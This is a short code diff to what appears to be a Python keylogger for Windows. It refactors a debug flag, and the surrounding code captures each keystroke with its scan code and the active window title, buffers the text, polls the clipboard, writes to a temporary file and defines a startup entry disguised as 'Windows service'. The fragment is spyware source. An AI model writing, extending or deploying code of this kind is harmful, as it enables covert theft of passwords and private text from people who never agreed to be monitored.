@@ -126,12 +126,12 @@ def on_key_down(event):
     Args:
         event: keyboard ebent
     """
-    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, DEBUG
+    global last_win, file_lock, text_buffer, BANNED_BUTTONS, BANNED_UNICODES, __debug__
     modifiers = get_modifiers()
     curr_win = GetWindowTextW(win32gui.GetForegroundWindow())
     un_char = ToUnicode(event.scan_code)
     unsided_name = event.name[event.name.find(" ")+1:]
-    if DEBUG:
+    if __debug__:
         print("Modifiers", modifiers)
         print("Unicode:", un_char)
         print("Scan code:", event.scan_code)
@@ -148,11 +148,10 @@ def on_key_down(event):
 
 
 if __name__ == "__main__":
-    DEBUG = True
     BD_INTERVAL = 2
     CLIP_POLL_RATE = 5
     FILE_NAME = NamedTemporaryFile(delete=False).name
-    if DEBUG:
+    if __debug__:
         print(FILE_NAME)
     STARTUP = False
     STARTUP_NAME = "Windows service"
